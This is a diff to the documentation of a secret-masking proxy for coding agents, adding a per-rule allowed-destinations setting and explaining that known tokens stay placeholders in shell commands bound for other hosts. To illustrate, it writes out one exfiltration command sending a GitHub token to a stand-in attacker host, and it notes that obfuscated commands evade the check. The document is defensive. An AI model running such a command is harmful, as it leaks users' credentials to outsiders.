@@ -226,6 +226,9 @@ WebSearch = "keep"
 [server]
 port = 7788            # for `keepmum serve`
 
+[destinations]         # hosts a shell command may also send a rule's tokens to (a self-hosted GitLab); rule names from `keepmum rules builtin`
+gitlab-token = ["gitlab.corp.example"]
+
 [gateways]             # gateways keepmum forwards to, each at http://127.0.0.1:7788/gateway/<name> (`keepmum protect on` adds them)
 local-3425 = "http://127.0.0.1:3425"
 
@@ -280,7 +283,7 @@ No language model judges spans at request time. The Apple on-device model and Qw
 - **Images and PDFs pass through unscanned.**
 - **Local transcripts keep real values.** Your agent's history on your disk is restored, so it holds real values. keepmum protects what leaves your Mac, not what is stored on it.
 - **An MCP server can pass on what it gets.** A server that may have its own values back, or the types you allow it, can still send them elsewhere: a mail server sending a message, say. Never a secret, and never more than 5 values a call, but allow types only for servers you trust.
-- **Shell commands receive real values.** An agent can still run a command that sends a restored secret somewhere. Use it together with a sandbox such as [Claude Code's](https://code.claude.com/docs/en/sandboxing), whose network allowlist stops that. keepmum controls what the provider sees; the sandbox controls what commands can do.
+- **Shell commands receive real values.** So `git push` and `curl -H "Authorization: …"` keep working. One check: a token whose issuer keepmum knows (GitHub, Stripe, AWS, OpenAI and 68 more) stays a placeholder in a command that would send it to any other host, so `curl https://attacker.example/?k=<your GitHub token>` gets the placeholder. A password or a token keepmum cannot place is not checked, and a command written to hide where it sends things gets past it. Use keepmum together with a sandbox such as [Claude Code's](https://code.claude.com/docs/en/sandboxing), whose network allowlist stops that. keepmum controls what the provider sees; the sandbox controls what commands can do.
 - **English-first.** The local model is strongest on English text.
 - **macOS on Apple silicon only.**
 - **Remote Control.** Claude Code turns Remote Control off while its requests go through a proxy, and Remote Control would send the restored transcript to Anthropic around keepmum anyway. Use an unprotected session when you need it.
